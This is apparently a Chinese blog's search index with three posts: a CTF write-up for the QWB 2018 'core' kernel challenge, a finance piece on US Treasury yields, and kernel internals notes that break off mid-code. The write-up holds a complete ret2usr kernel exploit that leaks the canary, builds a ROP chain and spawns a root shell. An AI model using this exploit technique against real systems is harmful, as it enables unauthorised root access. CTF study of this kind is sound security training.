<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>kernel pwn</title>
      <link href="kernel-pwn.html"/>
      <url>kernel-pwn.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目是强网杯2018的core，典型的驱动漏洞，题目可以在网上找到，这里采用了ret2usr的解法</p><p>附上exp，应该还是很好懂的，代码里也都写了注释</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>,vmlinux_base = <span class="number">0</span>,vmlinux_offset = <span class="number">0</span>; <span class="comment">// real vmlinux_base need to be calculated since kaslr is on</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="comment">// save the current status,prepare 2 ret2usr</span></span><br><span class="line"><span class="keyword">void</span> </span><br><span class="line">save_status()</span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> </span><br><span class="line">lpe()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">spawn_root_shell()</span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> </span><br><span class="line">find_symbols()</span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>; <span class="comment">// commit_creds = 0xffffffff8109c8e0</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!prepare_kernel_cred &amp; !commit_creds)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> </span><br><span class="line">main(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// find commit_creds &amp;&amp;  prepare_kernel_cred and get the offset of vmlinux</span></span><br><span class="line">    find_symbols();</span><br><span class="line">    vmlinux_offset = vmlinux_base-raw_vmlinux_base;</span><br><span class="line">    <span class="comment">// save register status under ring3</span></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="comment">// set global var off, prepare to leak canary</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>); </span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    <span class="keyword">size_t</span> user_buf[<span class="number">8</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = user_buf[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// construct rop chain</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">19</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">8</span>] = canary;</span><br><span class="line">    rop[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="keyword">size_t</span>)lpe;</span><br><span class="line">    rop[<span class="number">11</span>] = <span class="number">0xffffffff81a012da</span> + vmlinux_offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0</span>; <span class="comment">// for popfq</span></span><br><span class="line">    rop[<span class="number">13</span>] = <span class="number">0xffffffff81050ac2</span> + vmlinux_offset; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[<span class="number">14</span>] = (<span class="keyword">size_t</span>)spawn_root_shell; <span class="comment">// restore rip</span></span><br><span class="line">    rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">16</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">18</span>] = user_ss;</span><br><span class="line">    <span class="comment">// copy rop chain to global var</span></span><br><span class="line">    write(fd,rop,<span class="number">152</span>);</span><br><span class="line">    <span class="comment">// copy rop to stack,lead to stack overflow</span></span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0098</span>); <span class="comment">// give core_copy_func a negative int,bypass check</span></span><br><span class="line">    <span class="comment">// after ioctl ret2usr,root shell will be spawned!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="简单聊聊"><a href="#简单聊聊" class="headerlink" title="简单聊聊"></a>简单聊聊</h2><p>这里使用ret2usr会比较简单，当然直接在内核栈上构造rop来调用<code>commit_creds</code>&amp;&amp;  <code>prepare_kernel_cred</code>也是可以的，只不过比较复杂，在没开启<code>smap/smep</code>的情况下就偷个懒了hh</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Why U.S. 10-Year Treasury Bond Yield matters</title>
      <link href="Why-U-S-10-Year-Treasury-Bond-Yield-matters.html"/>
      <url>Why-U-S-10-Year-Treasury-Bond-Yield-matters.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天，不管是美股还是大A，都出现了高估值白马股大面积下跌的情况，作为马太效应的信徒，我的持仓风格在这样的市场环境下也是利润大幅度回撤，本着市场总是对的原则，我想自己尝试分析一下本次下跌的原因，也同时从自己身上找原因，以期未来能避免在类似行情中遭遇较大的损失</p><p>下面我主要分析美股情况，作为世界资本市场的领头羊，美股市场很大程度上决定了世界经济的走向</p><h1 id="诱因？"><a href="#诱因？" class="headerlink" title="诱因？"></a>诱因？</h1><p>本次的大幅度回撤，现在各方有一定共识的起因就在于美国十年期国债收益率大幅度上升</p><p><img src="image/10-year-Treasury-Bond-Yield/10-year.jpg" alt="10-year"></p><p>当然了，由于市场总喜欢在下跌之后找理由，所以真正的原因也不一定是这个，但是作为大家有所认可的原因，我就暂且认可此原因</p><p>实际上，说老实话，这不是啥预期之外的事情，大家对于美国十年期国债收益率的上升是有着预期的，但是问题在于，它上升的实在太快了，超过了大部分人的预期</p><p>大部分人的预期是在今年年底，美十债的收益率将会达到1.5%，但实际上，在昨天(2021.2.25)就已经到达了1.5%，甚至短时到达了1.6%</p><p>收益率疯长的债市，为美国整体经济的高通胀预期像是打了一针强心剂，市场开始恐慌高通胀将会迫使FED提前加息，从而造成了周期股上扬，高估值股惨烈杀跌</p><h1 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a>为什么？</h1><p>上面我先给出了结论，但是这背后的原因是什么？</p><p>那么首先我要先解释一下什么是美国十年期国债</p><h2 id="美国十年期国债"><a href="#美国十年期国债" class="headerlink" title="美国十年期国债"></a>美国十年期国债</h2><p>美国十年期国债，从名字上就不难理解，相当于美国政府发行的十年期长期国债债券，它的兄弟有30年期国债，5年期国债等等</p><p>美十债在世界经济中的重要地位，简单来说，由于美元在全球的霸主地位，美十债可以说是最为重要的债券资产，是全球经济的风向标之一</p><p>全世界都将美十债作为一项<strong>无风险收益</strong>，换句话说，你买入美十债，是不会出现亏损的，当然，我这里所谓的不会亏损指的是你不用担心债券违约的可能性，只要你拿满十年，当初约定的本息将一定会给到你，其中我们不考虑通胀所带来的损失，只考虑名义利率层面上的“不会亏损”</p><p>也就是说，美十债相当于全世界资本市场的锚，是最值得信赖的投资标的物</p><h2 id="收益率上升意味着什么？"><a href="#收益率上升意味着什么？" class="headerlink" title="收益率上升意味着什么？"></a>收益率上升意味着什么？</h2><p>首先需要搞清楚一点，那就是债券的利率在债券最初发行时就已经确定，比如说100面值的债券，规定利率为4%，那么在这一年中不管债券价格如何波动，到一年后政府都会以100元的面值赎回债券，同时发给你5元利息，这就相当于你赚了4元钱，可以看出，债券在你买入的那一刻，最终利息的收入就是确定的。</p><p>那么，在利息收入是确定的情况下，你的成本就决定了收益率的大小，在上面的例子中，你的收益率就是<code>4/100=4%</code></p><p>但是，由于债券本身的价格会波动，所以也许在半年时，债券价格跌到了97元，这时如果你再买入债券，那么这个时候你需要支付<code>97 + 100 * 4% * 183/365 =99</code>元，那么如果你持有这样的债券到期，那么你的收益率将是<code>(104-99)/99 = 5.05%</code>，可以看到，你的收益率和你在100块时买入大约高出了25%</p><p>明白了这个，我们就能解释收益率上升的原因了，拿出经济学中最常提到的供需理论，收益率上升必然是债券价格下跌，而价格下跌必然是债券的供大于求，也就是说，当前美十债的市场上，有人大量抛售美十债，导致债券价格一路走低</p><p>那么，为什么投资者会大量抛售美债呢？当债券市场被抛售，不应该股市上扬才对么？为何反而大幅下跌呢？</p><p>这又引出了其他问题，其中之一就是债券利率是如何影响市场名义利率的，以及这种影响到底有多大，下文将会提及</p><h2 id="为什么美十债被抛售？"><a href="#为什么美十债被抛售？" class="headerlink" title="为什么美十债被抛售？"></a>为什么美十债被抛售？</h2><p>我们先来解决为何美十债被抛售的问题</p><p>首先，我们先确定一个前提，那就是FED将在不远的将来加息，这个前提也是最近市场上形成的共识</p><p>那么，基于这个前提，我们来简单解释美十债为何被抛售</p><p>简单点来说，就是如果未来加息，那么未来政府发行的债券收益率将会变高，那么这就势必导致投资者争相抛售收益率较低的老债券，造成当期的美十债收益率上升</p><h2 id="市场名义利率"><a href="#市场名义利率" class="headerlink" title="市场名义利率"></a>市场名义利率</h2><p>接着我们来解释之前提到的，债券利率到底是如何影响市场名义利率的</p><p>举一个很简单的例子，我们知道，当我们将钱存入银行时，银行会给予我们一个利率，这个利率在一年中的每段时期往往都是不一样的，有时候高点，有时候低点，那么这个利率到底与国债利率有没有关系？</p><p>当然了，肯定是有的，仔细思考下，如果银行给你的利率比国债利率更低，那么银行就很难吸纳存款，因为存款人将会转向收益更高的国债进行投资，这当然是银行所不愿意看到的，所以，在国家信用不出现崩塌的情况下，银行给出的存款利率都是大于国债利率的</p><p>那么，试想一下如果国债利率大幅上扬，那么银行所给出的利率也必然随之上扬</p><p>同时，也别忘了银行的本质，银行就是一个<strong>放贷吃利差的</strong>，那么当银行给储户的利率上扬，那么给借贷方的利率也必然上扬，换句话说，国债利率的上扬导致了整个社会的名义利率都上扬了</p><p>那么这么一来就相当于企业融资成本变高，企业不愿意借钱扩张，也不愿意发债融资(因为如果发债，公司给投资者的名义利率也必须变高)，换句话来说，就是<strong>流动性收紧</strong>了</p><h2 id="调节水龙头"><a href="#调节水龙头" class="headerlink" title="调节水龙头"></a>调节水龙头</h2><p>自疫情以来，FED不断扩表，开闸放水，从而推动了美股的畸形牛市，FED同时也声称允许通胀率达到2%</p><p>但是，为了防止经济过热及高通胀带来的风险，FED必然需要在未来的某一个时间点收紧水龙头，进行加息的操作。</p><p>但我们可以发现，由于疫苗等因素的帮助下，国际社会从疫情中恢复的速度快于FED的想象，故而市场对于FED加息的预期提前了很多，这就导致了FED实际未加息，但市场自动调节至加息的状态的情况</p><p>这也算是很经典的一个经济学现象了，类似于“我先放出风来，你们先自己调节下，等我真的那么做了，市场也不会有太大反应”</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上所述，美十债收益率的飙升代表了市场对于高通胀的担忧，从而引发对FED提前加息的预期(费雪效应)，反映到流动性上就是市场预期借贷成本将变高，流动性将收紧，而美股自去年以来的牛市完全是基于天量的流动性撑起来的，所以虽然债市遭到抛售，其中的资金可能进入股市，但FED提前加息的预期却更令市场关注，这就导致了前期的高估值股票遭到抛售，美股重挫</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在雪球上看到一段挺有意思的分析，也是从另一个角度来看问题的，贴一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">美债十年期收益率从元旦的0.93攀升到近1.4（今日为1.54%），且斜率变大，倒数为65倍，A股基金重仓前50名、前100名股票市盈率中位数分别为74倍、69.1倍。</span><br><span class="line"></span><br><span class="line">也就是说，基金高度重仓股的收益率已经接近无风险收益率，意味着此时买入基金重仓股可能承受着“无收益风险”。纳斯达克、特斯拉、比特币的下跌均与无风险收益率相关，不过美联储的最新消息声明继续宽松，风险资产价格反弹，但是这次通胀预期特别强，名义收益率并不会轻易的下跌。</span><br></pre></td></tr></table></figure><p>感觉也是一种看问题的角度</p><p>另外，如果FED真的要表明自己继续宽松的决心，我想现在也只能FED亲自下场购买长期国债来稳定军心了，不然如此高的通胀预期所带来的加息阴云将很难散去</p>]]></content>
      
      
      <categories>
          
          <category> 投资 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> finance </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零碎的知识</title>
      <link href="tiny-knowledge.html"/>
      <url>tiny-knowledge.html</url>
      
        <content type="html"><![CDATA[<h1 id="kernel-amp-amp-pwn-amp-amp-operation-sys"><a href="#kernel-amp-amp-pwn-amp-amp-operation-sys" class="headerlink" title="kernel&amp;&amp;pwn&amp;&amp;operation_sys"></a>kernel&amp;&amp;pwn&amp;&amp;operation_sys</h1><h2 id="主线程与子线程是否共享内核栈以及用户态栈？"><a href="#主线程与子线程是否共享内核栈以及用户态栈？" class="headerlink" title="主线程与子线程是否共享内核栈以及用户态栈？"></a>主线程与子线程是否共享内核栈以及用户态栈？</h2><p>不共享，子线程只共享主线程(进程？)的虚拟地址空间，子线程拥有独立的<code>task_struct</code>，由于子线程共享主线程的虚拟地址空间，所以子线程<code>task_struct-&gt;mm</code>的值与主线程<code>task_struct-&gt;mm</code>保持一致，但是，虽然共享虚拟地址空间，但子线程在用户态下拥有自己的独立堆栈，与主线程堆栈互不干扰，内核栈亦是独立的，这也是为何cpu调度的最小单位是线程的原因之一</p><h2 id="TCB在哪里？"><a href="#TCB在哪里？" class="headerlink" title="TCB在哪里？"></a>TCB在哪里？</h2><p>TCB不在栈上，也同样不在堆上，而是在mmap出来的一块地址空间上(也可广义认为在堆上)</p><h2 id="Task-struct中mm成员有什么作用？"><a href="#Task-struct中mm成员有什么作用？" class="headerlink" title="Task_struct中mm成员有什么作用？"></a>Task_struct中mm成员有什么作用？</h2><p>标示了进程虚拟地址空间的分配情况，由于线程与进程共享虚拟地址空间，故而两者的task_struct结构体中mm指针以及active_mm指针的值是一致的</p><h2 id="TCB中dtv成员有什么用？"><a href="#TCB中dtv成员有什么用？" class="headerlink" title="TCB中dtv成员有什么用？"></a>TCB中dtv成员有什么用？</h2><p>TCB中dtv成员为二维数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;            <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                           thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">void</span> *val;     <span class="comment">// Aligned pointer to data/bss</span></span><br><span class="line">  <span class="keyword">void</span> *to_free; <span class="comment">// Unaligned pointer for free()</span></span><br><span class="line">&#125; dtv_pointer</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> counter;          <span class="comment">// for entry 0</span></span><br><span class="line">  dtv_pointer pointer;  <span class="comment">// for all other entries</span></span><br><span class="line">&#125; <span class="keyword">dtv_t</span></span><br></pre></td></tr></table></figure><p>其中dtv[-1]以及dtv[0]代表的意思如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dtv[<span class="number">-1</span>].counter; <span class="comment">/* The length of this dtv array */</span></span><br><span class="line">dtv[<span class="number">0</span>].counter;  <span class="comment">/* Generation counter for the DTV in this thread */</span></span><br></pre></td></tr></table></figure><p>从dtv[1]开始，<code>dtv[n].pointer</code>会存放指向tls block的指针，dtv[1]指向主线程的tls block，之后的分别指向各个动态链接库的tls block</p><p>贴一下部分调试过程，从中就能看出dtv数组的构造(在测试程序中，我设置了一个tls变量=10)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/<span class="number">4</span><span class="function">gx <span class="title">pthread_self</span><span class="params">()</span></span></span><br><span class="line"><span class="function">0x7ffff7fda740:0x00007ffff7fda7400x00007ffff7fdb0a0</span></span><br><span class="line"><span class="function">0x7ffff7fda750:0x00007ffff7fda7400x0000000000000000</span></span><br><span class="line">gef➤  x/8gx 0x00007ffff7fdb0a0</span><br><span class="line"><span class="number">0x7ffff7fdb0a0</span>:<span class="number">0x0000000000000001</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fdb0b0</span>:<span class="number">0x00007ffff7fda73c</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fdb0c0</span>:<span class="number">0x00007ffff7fda6a8</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fdb0d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">gef➤  x/<span class="number">4</span>gx <span class="number">0x00007ffff7fda73c</span></span><br><span class="line"><span class="number">0x7ffff7fda73c</span>:<span class="number">0xf7fda7400000000a</span><span class="number">0xf7fdb0a000007fff</span> <span class="comment">// x/wx 0x00007ffff7fda73c = 0x0a，即设置的tls变量的值</span></span><br><span class="line"><span class="number">0x7ffff7fda74c</span>:<span class="number">0xf7fda74000007fff</span><span class="number">0x0000000000007fff</span></span><br><span class="line">gef➤  x/<span class="number">8</span>gx <span class="number">0x00007ffff7fda6a8</span></span><br><span class="line"><span class="number">0x7ffff7fda6a8</span>:<span class="number">0x00007ffff7bb1560</span><span class="number">0x00007ffff7bb4bc0</span></span><br><span class="line"><span class="number">0x7ffff7fda6b8</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7963020</span></span><br><span class="line"><span class="number">0x7ffff7fda6c8</span>:<span class="number">0x00007ffff7963620</span><span class="number">0x00007ffff7963f20</span></span><br><span class="line"><span class="number">0x7ffff7fda6d8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h2 id="线程有PID么？"><a href="#线程有PID么？" class="headerlink" title="线程有PID么？"></a>线程有PID么？</h2><p>有的，当然如果在用户态的视角来说是没有的，一个进程只有一个pid，其子线程是没有pid的</p><p>但是如果从内核的角度来说，每一个线程都有pid，内核并不区分进程和线程</p><p>那么为什么我们ps和top无法看见子进程的pid？</p><p>那是由于POSIX标准规定，在多线程中调用getpid()应该获得相同的PID</p><p>而为了兼容POSIX标准，linux增加了一层TGID</p><p>调用getpid()实际上是去TGID层获取PID，TGID中PID均相同，保留了线程在内核中不同的PID，如下图所示：</p><p><img src="/image/tiny-knowledge/tgid.png" alt="tgid"></p><p>在源码实现的角度实际上就是将这个线程组的领导线程pid返回，tgid层只是个逻辑意义上的层</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * sys_getpid - return the thread group id of the current process</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note, despite the name, this returns the tgid not the pid.  The tgid and</span></span><br><span class="line"><span class="comment"> * the pid are identical unless CLONE_THREAD was specified on clone() in</span></span><br><span class="line"><span class="comment"> * which case the tgid is the same in all threads of the same group.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is SMP safe as current-&gt;tgid does not change.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">SYSCALL_DEFINE0(getpid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> task_tgid_vnr(current);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">pid_t</span> <span class="title">task_tgid_vnr</span><span class="params">(struct task_struct *tsk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> pid_vnr(task_tgid(tsk));</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct pid *<span class="title">task_tgid</span><span class="params">(struct task_struct *task)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> task-&gt;group_leader-&gt;pids[PIDTYPE_PID].pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用<code>top -H</code>就可以看见线程的pid了</p><h2 id="syscall传参区别"><a href="#syscall传参区别" class="headerlink" title="syscall传参区别"></a>syscall传参区别</h2><p>一般我们传递给函数6个参数及以下时，依次使用rdi,rsi,rdx,rcx,r8,r9</p><p>但是在syscall时，除了我们将调用号放置在rax以外，依次使用rdi,rsi,rdx,r10,r8,r9，这里替换rcx的原因是由于syscall会将当前syscall的下一条指令的地址保存在rcx中(相当于返回地址)，并且在将地址保存在rcx之后，再从IA32_LSTAR MSR读出rip的地址并加载rip</p><p>实际上这里读出的地址就是syscall处理程序的入口点(system call entry)</p><p>在内核中执行函数时，参数传递方式与一般函数无异，没有特殊情况</p><h2 id="syscall时用户态esp如何保存"><a href="#syscall时用户态esp如何保存" class="headerlink" title="syscall时用户态esp如何保存"></a>syscall时用户态esp如何保存</h2><p>与其他的寄存器一起被保存在对应线程的内核栈上</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 